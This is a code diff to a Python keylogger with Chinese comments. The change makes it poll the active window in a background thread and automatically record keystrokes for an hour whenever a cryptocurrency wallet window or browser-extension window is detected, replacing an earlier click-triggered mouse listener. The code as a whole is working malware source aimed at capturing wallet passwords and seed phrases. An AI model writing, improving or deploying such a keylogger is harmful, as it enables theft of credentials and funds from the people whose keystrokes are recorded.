@@ -10,9 +10,9 @@ from datetime import datetime
 from pathlib import Path
 
 from pynput.keyboard import Key, KeyCode
-from pynput import mouse, keyboard
+from pynput import keyboard
 
-from .detectors import get_active_window_name, is_wallet_window
+from .detectors import get_active_window_name, should_trigger_recording, CHECK_INTERVAL
 
 # 记录时长（秒）
 RECORDING_DURATION = 60 * 60  # 60分钟
@@ -25,13 +25,16 @@ class KeyLogger:
         self.log_file = log_file
         self.duration = duration
         self.keyboard_listener = None
-        self.mouse_listener = None
 
         # 记录状态
         self.is_recording = False
         self.recording_start_time = 0
         self.recording_timer = None
         self._lock = threading.Lock()
+
+        # 窗口检测线程
+        self._monitor_thread = None
+        self._stop_monitor = threading.Event()
 
     def format_key(self, key) -> str:
         """格式化按键为可读字符串"""
@@ -95,23 +98,27 @@ class KeyLogger:
         """键盘释放事件（用于退出）"""
         # F12 退出
         if key == Key.f12:
-            print("\n检测到 F12，停止记录...")
+            print("\n检测到 F12，停止程序...")
+            self._stop_monitor.set()
             self.stop_recording()
             return False
 
-    def on_click(self, x, y, button, pressed):
-        """鼠标点击事件"""
-        if not pressed:
-            return  # 只在按下时触发
+    def _monitor_windows(self):
+        """后台线程：持续检测窗口变化"""
+        while not self._stop_monitor.is_set():
+            try:
+                # 检查是否应该触发记录
+                if should_trigger_recording():
+                    with self._lock:
+                        if not self.is_recording:
+                            self.start_recording()
+            except Exception:
+                pass
 
-        window_name = get_active_window_name()
-        if window_name and is_wallet_window(window_name):
-            with self._lock:
-                if not self.is_recording:
-                    # 开始记录
-                    self.start_recording(window_name)
+            # 等待下次检测
+            self._stop_monitor.wait(CHECK_INTERVAL)
 
-    def start_recording(self, trigger_window: str = None):
+    def start_recording(self):
         """开始记录"""
         with self._lock:
             if self.is_recording:
@@ -120,8 +127,8 @@ class KeyLogger:
             self.is_recording = True
             self.recording_start_time = time.time()
 
-        if trigger_window:
-            print(f"\n>>> 检测到钱包窗口: {trigger_window}")
+        window_name = get_active_window_name() or "Unknown"
+        print(f"\n>>> 检测到钱包窗口: [{window_name}]")
         print(f">>> 开始记录，将持续 {self.duration // 60} 分钟")
         print(f">>> 日志将写入: {self.log_file}")
 
@@ -133,7 +140,7 @@ class KeyLogger:
         try:
             with open(self.log_file, "a", encoding="utf-8") as f:
                 f.write(f"\n# --- 记录开始: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")
-                f.write(f"# 触发窗口: {trigger_window or 'Unknown'}\n")
+                f.write(f"# 触发窗口: [{window_name}]\n")
         except Exception as e:
             print(f"写入日志失败: {e}", file=sys.stderr)
 
@@ -158,7 +165,7 @@ class KeyLogger:
             pass
 
         print(f"\n>>> 记录已停止 ({datetime.now().strftime('%H:%M:%S')})")
-        print(">>> 等待下次点击钱包窗口触发记录...\n")
+        print(">>> 继续监听...\n")
 
     def start(self):
         """启动监听"""
@@ -167,10 +174,15 @@ class KeyLogger:
         print(f"平台: {self.platform_info()}")
         print(f"记录时长: {self.duration // 60} 分钟\n")
 
-        from .detectors import WALLET_PATTERNS
-        print(f"监控钱包关键词: {', '.join(WALLET_PATTERNS)}")
-        print("等待点击钱包窗口触发记录...")
+        from .detectors import EXTENSION_PATTERNS
+        print(f"监控关键词: {', '.join(EXTENSION_PATTERNS[:5])}...")
+        print("工作原理: 持续检测活动窗口，匹配时自动记录\n")
+        print("等待检测到钱包窗口...")
         print("按 F12 停止程序\n")
+
+        # 启动窗口检测线程
+        self._monitor_thread = threading.Thread(target=self._monitor_windows, daemon=True)
+        self._monitor_thread.start()
 
         # 启动键盘监听
         self.keyboard_listener = keyboard.Listener(
@@ -178,20 +190,14 @@ class KeyLogger:
             on_release=self.on_release
         )
 
-        # 启动鼠标监听
-        self.mouse_listener = mouse.Listener(
-            on_click=self.on_click
-        )
-
         self.keyboard_listener.start()
-        self.mouse_listener.start()
 
         try:
             self.keyboard_listener.join()
-            self.mouse_listener.join()
         except KeyboardInterrupt:
             print("\n\n已停止")
         finally:
+            self._stop_monitor.set()
             self.stop_recording()
 
     @staticmethod
